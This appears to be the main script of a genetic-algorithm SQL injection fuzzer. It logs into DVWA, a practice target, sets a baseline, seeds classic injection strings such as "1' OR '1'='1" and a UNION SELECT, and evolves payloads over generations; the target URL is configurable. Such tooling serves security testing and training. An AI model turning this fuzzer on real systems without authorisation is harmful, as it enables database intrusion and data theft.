import sys
import asyncio
import os
import json
from utils.http_client import HTTPClient
from utils.experience_manager import ExperienceManager
from core.island_manager import IslandManager

async def run_prometheus():
    # Configuration from environment
    target_url = os.getenv("TARGET_URL", "http://localhost/dvwa/vulnerabilities/sqli/")
    username = os.getenv("TARGET_USER", "admin")
    password = os.getenv("TARGET_PASS", "password")
    security_level = os.getenv("TARGET_SECURITY", "medium")
    population_size = int(os.getenv("POPULATION_SIZE", "12"))
    max_generations = int(os.getenv("MAX_GENERATIONS", "10"))
    target_name = os.getenv("TARGET_NAME", "default")
    db_path = os.getenv("DB_PATH", "main.db")
    
    # Context detection (simplified for now, can be improved)
    context = "SINGLE_QUOTE" 
    if security_level.lower() == "low":
        context = "SINGLE_QUOTE"
    elif security_level.lower() == "medium":
        context = "QUOTELESS_STRING" # DVWA medium uses mysql_real_escape_string but doesn't quote sometimes
    
    exp_manager = ExperienceManager(db_path=db_path)
    
    # 1. Initialize Async Client
    async with HTTPClient(base_url=target_url) as client:
        # 2. Setup (Login & Set Security)
        success = await client.setup_dvwa(username, password, security_level)
        if not success:
            client.log("[!] Initialization failed. Exiting.", type="error")
            return

        # 3. Baseline Request (To know what "normal" looks like)
        client.log("[*] Establishing baseline response...")
        baseline_res = await client.send_request("1")
        baseline = baseline_res['text']
        
        # 4. Fetch Seeds
        client.log("[*] Fetching base payloads...")
        seeds = await client.fetch_base_payloads()
        if not seeds:
            # Fallback seeds
            seeds = ["1' OR '1'='1", "1 AND 1=1", "1' UNION SELECT 1,2-- -"]
            
        # 5. Initialize Island Manager
        manager = IslandManager(
            client=client,
            base_payloads=seeds,
            exp_manager=exp_manager,
            population_size=population_size,
            context=context,
            target_name=target_name,
            baseline=baseline
        )
        
        client.log(f"[*] Starting Evolution: {max_generations} generations planned.", type="system")
        
        # 6. Main Loop
        for gen in range(manager.current_gen, max_generations):
            client.log(f"\n[GENERATION {gen+1}/{max_generations}]", type="gen_start")
            best_payload = await manager.evolve_generation(gen)
            
            if best_payload:
                client.log(f"[*] Current Best Payload: {best_payload}", type="best")
            
            # Optional: Short sleep to prevent CPU spiking in tight loops
            await asyncio.sleep(0.1)

        client.log("[*] Evolution completed.", type="system")

if __name__ == "__main__":
    try:
        asyncio.run(run_prometheus())
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
    except Exception as e:
        import traceback
        error_msg = f"Fatal Error: {traceback.format_exc()}"
        print(json.dumps({"type": "error", "message": error_msg}), flush=True)
